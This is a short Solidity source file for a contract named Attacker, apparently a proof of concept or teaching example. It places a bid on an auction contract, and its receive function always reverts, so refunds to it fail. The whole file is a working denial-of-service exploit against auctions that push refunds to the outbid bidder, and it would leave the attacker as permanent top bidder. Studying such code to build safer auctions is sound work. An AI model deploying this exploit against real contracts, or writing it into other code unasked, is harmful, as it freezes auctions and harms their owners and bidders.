// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface Iauction{
        function bid() payable external;
}

contract Attacker{
         address public owner;
         Iauction public immutable auc;

        constructor (address  addr){
            auc = Iauction(addr);
            owner = msg.sender;
         }

        function attack() external payable {
            auc.bid{value: msg.value}();
        }

        receive() external payable {
                      revert();
        }                     
}
